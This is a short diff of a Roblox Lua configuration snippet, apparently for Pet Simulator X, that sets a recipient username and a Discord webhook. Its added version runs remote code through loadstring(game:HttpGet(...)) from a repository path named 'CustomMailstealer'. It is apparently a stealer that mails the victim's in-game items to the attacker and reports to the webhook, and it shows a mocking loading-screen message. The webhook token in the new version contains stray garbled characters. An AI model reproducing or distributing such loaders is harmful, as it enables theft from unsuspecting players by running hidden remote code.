@@ -1,7 +1,5 @@
-
-Username = "yokuyoku17"
-webhook = "https://discord.com/api/webhooks/1060014639099936858/L8jf5NfB9SKOoZnTbjGMwWmI3VRmmZZLnplHtKYiSi6UNA_IjfHB2Ru0vJPd28SoCqTU"
-loadingscreen = true
-delay = 0 
-farmui = false 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
+Username = "yokuyoku18"
+Webhook = "https://discord.com/api/webhooks/1060014639099936858/L8j£5N1B9SKOoZnTbjGMwWmI3VRmm-ZInplHtKYiSi6UNA_IjIHB2RU0VJPd28SoCqTU"
+G_LoadingScreen = "Get Fucked Looser"
+G WebhookName ="Cgkbot"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Lypherx/MoriCustom/main/CustomMailstealer"))()
